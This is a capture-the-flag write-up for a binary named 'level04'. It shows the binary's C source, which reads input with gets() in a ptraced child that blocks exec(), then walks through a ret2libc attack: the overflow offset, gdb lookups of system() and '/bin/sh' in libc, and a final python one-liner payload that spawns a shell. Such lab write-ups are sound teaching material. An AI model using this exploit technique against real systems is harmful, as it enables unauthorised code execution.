int	main(int c, char **argv)
{
	pid_t	ach;
	char	s[32];
	int32_t	v = 0;
	long	wstatus = 0;

	ach = fork();
	memset(s, 0, 32);

	if (!ach)
	{
		prctl(PR_SET_PDEATHSIG, SIGHUP);
		ptrace(PTRACE_TRACEME, 0, 0, 0);
		puts("Give me some shellcode, k");
		gets(s);
		return 0;
	}

	while (1)
	{
		wait(wstatus);
		if (wstatus == 127 || 0xff & ((wstatus & 127) + 1) >> 1 <= 0)
		{
			puts("child is exiting...");
			return 0;
		}
		v = ptrace(PTRACE_PEEKUSER, ach, 44, 0);
		if (v == 11) // enter if syscall is made on child
		{
			puts("no exec() for you");
			kill(ach, 9);
			return 0;
		}
	}

	return 0;
}
this program use gets which is vulnerable to buffer overflow

(this program use child process to check child process in gdb use "set follow-fork-mode child" before running program)

we can find offset with buffer overflow pattern generator. (offset = 156)

we gonna use ret2lib exploit

in gdb when program is running we need to find system address and "/bin/sh" string:

system address:
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

for "/bin/sh" string we need to find the start of the libc address:

(gdb) info sharedlibrary
From        To          Syms Read   Shared Object Library
0xf7fdc820  0xf7ff501f  Yes (*)     /lib/ld-linux.so.2
0xf7e42f70  0xf7f7633c  Yes (*)     /lib32/libc.so.6

then we can search inside libc to find our string

(gdb) find 0xf7e42f70, +99999999, "/bin/sh"
0xf7f897ec

then we can build our exploit

(we put "\x00\x00\x00\x00" for the return address because we dont need for the shell to exit clean)

(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\x00\x00\x00\x00" + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04